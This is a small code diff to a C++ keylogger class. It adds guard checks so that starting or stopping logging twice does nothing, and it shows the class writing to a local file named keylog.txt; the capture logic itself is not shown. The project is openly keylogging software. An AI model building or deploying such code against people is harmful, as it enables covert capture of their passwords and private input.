@@ -12,7 +12,7 @@
 
 KeyLogger::KeyLogger(): 
 // buf(new char[kBufSize]), 
-stop(true) {
+stop(true) { 	
 }
 
 KeyLogger::KeyLogger(const KeyLogger &o) {  
@@ -108,6 +108,9 @@ KeyLogger& KeyLogger::operator=(const KeyLogger &o) {
 
 // TODO MOUSE
 void KeyLogger::startKeylogger() {
+	if (!stop)
+		return;
+
     fout = std::ofstream("keylog.txt", std::fstream::out);
     if (!fout.good()) {
         std::cout << "error creating keylogger file\n";
@@ -138,6 +141,9 @@ void KeyLogger::startKeylogger() {
 }
 
 void KeyLogger::stopKeylogger() {
+	if (stop)
+		return;	
+
     stop = true;
     fout.close();
 	logThread.join();
